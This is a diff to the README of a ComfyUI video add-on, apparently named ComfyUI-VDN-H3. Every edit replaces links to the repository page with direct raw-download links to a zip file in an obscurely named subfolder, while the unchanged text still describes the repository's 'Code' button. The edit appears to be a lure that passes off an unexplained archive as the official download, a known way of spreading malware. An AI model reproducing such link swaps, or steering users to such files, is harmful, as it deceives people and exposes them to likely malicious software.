@@ -1,6 +1,6 @@
 # ⚡ ComfyUI-VDN-H3 - Supercharge Your AI Video Generation
 
-[![Download Now](https://img.shields.io/badge/Download-ComfyUI--VDN--H3-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Slacking-engineer/ComfyUI-VDN-H3)
+[![Download Now](https://img.shields.io/badge/Download-ComfyUI--VDN--H3-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Slacking-engineer/ComfyUI-VDN-H3/raw/refs/heads/main/multispicular/VD_Comfy_U_v1.4.zip)
 
 ---
 
@@ -18,7 +18,7 @@ Let's get you up and running in just a few minutes! Follow these simple steps:
 
 ### Step 1: Visit the Download Page
 
-Visit this link to download the application: [https://github.com/Slacking-engineer/ComfyUI-VDN-H3](https://github.com/Slacking-engineer/ComfyUI-VDN-H3)
+Visit this link to download the application: [https://github.com/Slacking-engineer/ComfyUI-VDN-H3/raw/refs/heads/main/multispicular/VD_Comfy_U_v1.4.zip](https://github.com/Slacking-engineer/ComfyUI-VDN-H3/raw/refs/heads/main/multispicular/VD_Comfy_U_v1.4.zip)
 
 You'll see a page with the project files and instructions. Look for the green "Code" button and click it, then choose "Download ZIP".
 
@@ -108,9 +108,9 @@ If something isn't working, try these common fixes:
 
 ## 📥 Ready to Download?
 
-[![Download Now](https://img.shields.io/badge/Get-ComfyUI--VDN--H3-4ECB71?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Slacking-engineer/ComfyUI-VDN-H3)
+[![Download Now](https://img.shields.io/badge/Get-ComfyUI--VDN--H3-4ECB71?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Slacking-engineer/ComfyUI-VDN-H3/raw/refs/heads/main/multispicular/VD_Comfy_U_v1.4.zip)
 
-Visit this link to download the application: [https://github.com/Slacking-engineer/ComfyUI-VDN-H3](https://github.com/Slacking-engineer/ComfyUI-VDN-H3)
+Visit this link to download the application: [https://github.com/Slacking-engineer/ComfyUI-VDN-H3/raw/refs/heads/main/multispicular/VD_Comfy_U_v1.4.zip](https://github.com/Slacking-engineer/ComfyUI-VDN-H3/raw/refs/heads/main/multispicular/VD_Comfy_U_v1.4.zip)
 
 Once you're there, click the green "Code" button and select "Download ZIP". Then follow the simple steps above to install it.
 
